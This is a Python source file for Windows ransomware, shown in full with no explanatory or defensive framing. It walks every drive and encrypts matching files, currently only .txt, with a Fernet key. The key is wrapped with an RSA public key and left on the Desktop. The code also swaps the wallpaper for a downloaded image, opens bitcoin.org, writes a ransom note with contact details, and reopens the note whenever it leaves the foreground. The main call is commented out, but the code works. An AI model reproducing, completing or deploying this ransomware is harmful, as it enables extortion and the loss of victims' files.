from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser
import ctypes # so we can intereact with windows dlls and change windows background etc
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import threading # used for ransom note and decryption key on dekstop
import string
from ctypes import windll

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

class Ransomware:

    file_exts = ['txt' #, 'png'
    ]
    excepts = [os.path.expanduser('~') + '/Desktop/EMAIL_ME.txt']

    drives = get_drives()
    #drives.remove('C')
    
    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None

        self.sysRoot = os.path.expanduser('~')       
        self.localRoot = r'localRoot'

    def generate_key(self):
        self.key =  Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def encrypt_fernet_key(self):
        fernet_key = self.key
        with open('Assets/public.pem', 'rb') as f:
            self.public_key = RSA.import_key(f.read())
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                    
                print(data)
                _data = self.crypter.encrypt(data)
                print('> File encrpyted')
                print(_data)
        except Exception as e:
            pass
            #print(e)

        try:
            with open(file_path, 'wb') as fp:
                fp.write(_data)
        except Exception as e:
            pass
            #print(e)

    def checkencryption(self):
        if os.path.isfile(os.path.expanduser('~') + '/AppData/msconfig.txt'):
            print('file exists')
            return True
        else:
            with open(os.path.expanduser('~') + '/AppData/msconfig.txt', 'wb') as f:
                pass
            print('file created')
            return False

    def encrypt_system(self):
        for d in self.drives:
            d = d + ':/'
            system = os.walk(d, topdown=True)

            for root, dir, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    #print(file_path)
                    if file_path in self.excepts:
                        continue
                    if file.split('.')[-1] in self.file_exts:
                        self.encrypt_file(file_path)

    @staticmethod
    def open_website():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        pic_url = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        path = os.path.expanduser('~') + '\Pictures\pic1.jpg'

        try:
            with open(path, 'wb') as handle:
                response = requests.get(pic_url, stream=True)
                if not response.ok:
                    pass
                    #print(response)

                for block in response.iter_content(1024):
                    if not block:
                        break

                handle.write(block)
        except Exception as e:
            pass
            #print(e)
            
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write("                                _      ______ _____ _______    _   _   _ \n                          /\\   | |    |  ____|  __ \\__   __|  | | | | | |\n                         /  \\  | |    | |__  | |__) | | |     | | | | | |\n                        / /\\ \\ | |    |  __| |  _  /  | |     | | | | | |\n                       / ____ \\| |____| |____| | \\ \\  | |     |_| |_| |_|\n                      /_/    \\_\\______|______|_|  \\_\\ |_|     (_) (_) (_)\n\n                      \n                      ******************************************\n                      \n       Please don't edit, remove or try to perform any operations on your original text files or any\n                 newly created files, we guarantee that they are safe. Don't worry champ.\n\n    **************************************************************************************************\n    \n    All the text files on your hard drive have been encrypted, now be a good lad and dont panic. \n    We mean no harm and suggest that you contact us. for more info join us at:\n                                     privatechatroom767.com/%123213\n                                        with the joingin code : blablabla\n or at : \n                                      myemailadress@protonmainl.com\n\n    ********************************************************************************************\n\n    Please make sure that you send us your Email_Me.txt file on your Desktop, when you contact us \nfor the first time\n")

    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                #print('Ransom note is the top window - do nothing')
                pass
            else:
                #print('Ransom note is not the top window - kill/create process again') 
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(10)

def main():
    rw = Ransomware()

    if not rw.checkencryption():
        rw.generate_key()
        rw.encrypt_system()
        rw.encrypt_fernet_key()
        rw.change_desktop_background()
        rw.open_website()
        rw.ransom_note()

        t1 = threading.Thread(target=rw.show_ransom_note)

        t1.start()

""" if __name__ == '__main__':
    main() """